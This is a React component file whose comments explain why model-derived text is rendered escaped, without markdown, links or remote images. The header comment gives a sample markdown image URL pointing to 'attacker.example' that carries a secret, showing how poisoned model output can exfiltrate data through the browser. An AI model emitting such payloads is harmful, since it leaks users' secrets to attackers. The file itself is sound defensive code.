import React from 'react';

/**
 * INV-9 — untrusted and model-derived text is rendered escaped. Never as HTML,
 * never auto-linkified, and never as the source of a loaded resource.
 *
 * Why this component exists at all:
 *
 * Model output is DERIVED from untrusted content and can be poisoned. A
 * markdown renderer turns `![](https://attacker.example/x.png?d=SECRET)` into
 * an <img>, and the browser fetches it the moment it paints. That is a working
 * exfiltration channel that needs no tool call, no capability grant, and no
 * cooperation from the model beyond emitting a string.
 *
 * The airlock stops untrusted text from causing an *action*. It does nothing
 * about the browser being tricked into making a request on the attacker's
 * behalf. This is the other half of the boundary, and it lives in the renderer.
 *
 * React escapes interpolated strings, so rendering {text} inside a <div> is
 * already safe from script injection. The work here is refusing to do the
 * *convenient* things a chat UI normally does: parse markdown, autolink URLs,
 * and load remote images.
 */

interface UntrustedTextProps {
  text: string;
  className?: string;
  /** Shown when the text is empty, e.g. a failed Reader pass. */
  placeholder?: string;
}

/**
 * URLs are shown as inert text, deliberately not as anchors.
 *
 * An <a href> in model-derived output is a one-click phish: the label can say
 * anything while the target says something else. Showing the URL as plain text
 * means the user reads the real destination and decides for themselves.
 */
export const UntrustedText: React.FC<UntrustedTextProps> = ({
  text,
  className = '',
  placeholder = 'No content.',
}) => {
  const value = typeof text === 'string' ? text : '';

  if (!value.trim()) {
    return <p className={`text-sm italic text-[#8a8a75] ${className}`}>{placeholder}</p>;
  }

  return (
    <div
      className={`whitespace-pre-wrap break-words font-sans text-sm leading-relaxed text-[#2c2c24] ${className}`}
      // No dangerouslySetInnerHTML. No markdown parser. No linkifier.
      // React escapes this; that is the entire point.
    >
      {value}
    </div>
  );
};

/**
 * For text the signed-in user typed themselves. Same renderer, different name
 * at the call site so a reader of the code can see which zone is in play.
 *
 * First-party content is not rendered as HTML either: a user who pastes a
 * poisoned string into their own entry should not be able to attack their own
 * browser with it, and the distinction is not worth a second code path.
 */
export const UserText: React.FC<UntrustedTextProps> = (props) => <UntrustedText {...props} />;
